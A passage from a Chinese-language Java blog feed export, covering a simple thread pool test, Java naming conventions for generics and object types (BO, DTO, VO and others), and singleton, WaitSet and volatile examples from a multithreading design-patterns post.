<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 线程池测试类
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SimpleThreadTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token class-name">SimpleThreadPool</span> threadPool <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>index <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                    threadPool<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                                    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1_000L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Task "</span> <span class="token operator">+</span> index <span class="token operator">+</span> <span class="token string">" be serviced by "</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token punctuation">}</span>
                            <span class="token punctuation">}</span>
                    <span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// Thread.sleep(10_000);</span>
        threadPool<span class="token punctuation">.</span><span class="token function">shutDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java命名规范</title>
    <url>/20230317/1761bce2.html</url>
    <content><![CDATA[<h1>Java命名规范</h1>
<h2 id="泛型类">泛型类</h2>
<p>在书写泛型类时，通常做以下的约定：</p>
<ul>
<li>E表示Element，通常用在集合中；</li>
<li>ID用于表示对象的唯一标识符类型</li>
<li>T表示Type(类型)，通常指代类；</li>
<li>K表示Key(键), 通常用于Map中；</li>
<li>V表示Value(值),通常用于Map中，与K结对出现；</li>
<li>N表示Number,通常用于表示数值类型；</li>
<li>？表示不确定的Java类型；</li>
<li>X用于表示异常；</li>
<li>U,S表示任意的类型。</li>
</ul>
<h2 id="速记Java开发中的各种O">速记Java开发中的各种O</h2>
<p>通过一张表和图快速对Java中的<code>BO</code>,<code>DTO</code>,<code>DAO</code>,<code>PO</code>,<code>POJO</code>,<code>VO</code>之间的含义，区别以及联系进行梳理。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>使用范围</th>
<th>解释说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>BO</td>
<td>用于Service,Manager,Business等业务相关类的命名</td>
<td>Business Object业务处理对象，主要作用是把业务逻辑封装成一个对象。</td>
</tr>
<tr>
<td>DTO</td>
<td>经过加工后的PO对象，其内部属性可能增加或减少</td>
<td>Data Transfer  Object数据传输对象，主要用于远程调用等需要大量传输数据的地方，例如，可以将一个或多个PO类的部分或全部属性封装为DTO进行传输</td>
</tr>
<tr>
<td>DAO</td>
<td>用于对数据库进行读写操作的类进行命名</td>
<td>Data Access  Object数据访问对象，主要用来封装对数据库的访问，通过DAO可以将POJO持久化为PO，也可以利用PO封装出VO和DTO</td>
</tr>
<tr>
<td>PO</td>
<td>Bean,Entity等类的命名</td>
<td>Persistant  Object持久化对象，数据库表中的数据在Java对象中的映射状态，可以简单的理解为一个PO对象即为数据库表中的一条记录</td>
</tr>
<tr>
<td>POJO</td>
<td>POJO是DO/DTO/BO/VO的统称</td>
<td>Plain Ordinary Java Object  简单Java对象，它是一个简单的普通Java对象，禁止将类命名为XxxxPOJO</td>
</tr>
<tr>
<td>VO</td>
<td>通常是视图控制层和模板引擎之间传递的数据对象</td>
<td>Value Object  值对象，主要用于视图层，视图控制器将视图层所需的属性封装成一个对象，然后用一个VO对象在视图控制器和视图之间进行数据传输。</td>
</tr>
<tr>
<td>AO</td>
<td>应用层对象</td>
<td>Application Object，在Web层与Service层之间抽象的复用对象模型，很少用。</td>
</tr>
</tbody>
</table>
<p>下面将通过一张图来理解上述几种O之间相互转换的关系：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/eae992c8-ce71-47df-ae94-eca9bc91dac0-1679046277720-1.jpg" alt="微信图片_20211213004837"></p>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>多线程设计模式</title>
    <url>/20221101/8c062783.html</url>
    <content><![CDATA[<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/%E5%B9%B6%E5%8F%91%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-1667230559743-54.png" alt="JAVA并发设计模式"></p>
<h1>Chapter1：单例设计模式（七种设计方式）</h1>
<blockquote>
<p>Java高并发编程详解：第十四章</p>
</blockquote>
<h2 id="饿汉式">饿汉式</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonObject1</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">SingletonObject1</span> instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SingletonObject1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">SingletonObject1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">SingletonObject1</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>instance作为类变量，在主动使用SingletonObject1的时候，instance会被加载，包括其中的实例变量也会得到初始化。</p>
<ul>
<li>保证单例的唯一性</li>
<li>instance被ClassLoader加载很长时间后才会被使用 ，所有instance所占用的堆内存会被占用很久（instance实例比较大，就会占用比较大的堆内存）</li>
</ul>
<h2 id="懒汉式（懒加载）">懒汉式（懒加载）</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonObject2</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">SingletonObject2</span> instance<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">SingletonObject2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">SingletonObject2</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>instance <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SingletonObject2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>
<p>多线程下，可能会存在多个实例，不能保证单例的唯一性</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220104175246651-1667230559743-53.png" alt="image-20220104175246651"></p>
</li>
</ul>
<h2 id="懒汉式-同步方法">懒汉式+同步方法</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonObject3</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">SingletonObject3</span> instance<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">SingletonObject3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">static</span> <span class="token class-name">SingletonObject3</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>instance <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
            instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SingletonObject3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>
<p>保证单例的唯一性</p>
</li>
<li>
<p>每次读取 都需要抢锁，同一时间只能有一个线程访问，性能低</p>
</li>
</ul>
<h2 id="Double-Check">Double Check</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Socket</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Connection</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonObject4</span> <span class="token punctuation">{</span>
    <span class="token comment">// 实例变量</span>
    <span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">Connection</span> connection<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">Socket</span> socket<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">SingletonObject4</span> instance <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">SingletonObject4</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 初始化connection</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>connection
        <span class="token comment">// 初始化socket</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>socket
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">SingletonObject4</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 当instance为null时，进入同步代码块，可避免每次读取都进入</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>instance <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 只有一个线程能获取到SingletonObject4.classg关联的monitor</span>
            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token class-name">SingletonObject4</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 判断如果instance为null时重建</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>instance <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
                    instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SingletonObject4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>根据JVM运行时指令重排序和Happens-Before规则，instance、connection和 socket 的实例化顺序并无前后关系的约束，那么极有可能是instance最先被实例化，而conn和sock并未完成实例化，并未完成初始化的实例调用其方法会<strong>抛出空指针异常</strong></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220104182128644-1667230559743-55.png" alt="image-20220104182128644"></p>
<h2 id="Volatile-Double-Check">Volatile + Double Check</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">static</span> <span class="token class-name">SingletonObject4</span> instance <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>Double Check 方法调整下，SingletonObject4 实例化的过程中不允许重排序。</li>
<li>volatile 也不是线程安全的</li>
</ul>
<h2 id="Holder方式（推荐1）">Holder方式（推荐1）</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonObject6</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">SingletonObject6</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 在静态内部类中持有SingletonObject6的实例，并且可被直接初始化</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">InstanceHolder</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">SingletonObject6</span> instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SingletonObject6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 调用getInstance方法，实际上是获得InstanceHolder的instance静态属性</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">SingletonObject6</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token class-name">InstanceHolder</span><span class="token punctuation">.</span>instance<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当InstanceHolder被主动引用的时候，才会创建SingletonObject6的实例（static 主动加载）</p>
<h2 id="枚举方式（推荐2）">枚举方式（推荐2）</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SingletonObject7</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">SingletonObject7</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"3-----------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">enum</span> <span class="token class-name">Singleton</span> <span class="token punctuation">{</span>
        <span class="token constant">INSTANCE</span><span class="token punctuation">;</span>

        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">SingletonObject7</span> instance<span class="token punctuation">;</span>

        <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"2-----------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SingletonObject7</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token class-name">SingletonObject7</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"4-----------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>instance<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">SingletonObject7</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"1-----------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token class-name">Singleton</span><span class="token punctuation">.</span><span class="token constant">INSTANCE</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">SingletonObject7</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">SingletonObject7</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">1</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token number">2</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token number">3</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token number">4</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token number">1836019240</span>
<span class="token number">1</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token number">4</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token number">1836019240</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Chapter2：WaitSet（等待池）</h1>
<ol>
<li>
<p>所有的对象都会有一个wait set, 用来存放调用了该对象wait方法之后进入了block状态的线程</p>
</li>
<li>
<p>线程被notify之后，进入runnable状态，不一定立即得到执行</p>
</li>
<li>
<p>线程从wait set 中被唤醒的顺序不一定是FIFO</p>
</li>
<li>
<p>线程从wait set 中被唤醒之后，需要重新抢锁。抢到锁之后，根据wait时记录的执行代码地址，进行==地址恢复==，继续往后执行。</p>
</li>
</ol>
<h1>Chapter3：volatile 关键字</h1>
<blockquote>
<p>Java高并发编程详解：第十二章、第十三章</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">VolatileTest</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token constant">INIT_VALUE</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token constant">MAX_VALUE</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> localValue <span class="token operator">=</span> <span class="token constant">INIT_VALUE</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>localValue <span class="token operator">&lt;</span> <span class="token constant">MAX_VALUE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>localValue <span class="token operator">!=</span> <span class="token constant">INIT_VALUE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The value updated from [%d] to [%d]\n"</span><span class="token punctuation">,</span> localValue<span class="token punctuation">,</span> <span class="token constant">INIT_VALUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    localValue <span class="token operator">=</span> <span class="token constant">INIT_VALUE</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"READER"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> localValue <span class="token operator">=</span> <span class="token constant">INIT_VALUE</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>localValue <span class="token operator">&lt;</span> <span class="token constant">MAX_VALUE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token constant">INIT_VALUE</span> <span class="token operator">=</span> <span class="token operator">++</span>localValue<span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Update the value to [%d]\n"</span><span class="token punctuation">,</span> <span class="token constant">INIT_VALUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"WRITER"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果</p>
<pre class="line-numbers language-apl" data-language="apl"><code class="language-apl">Update the value to <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
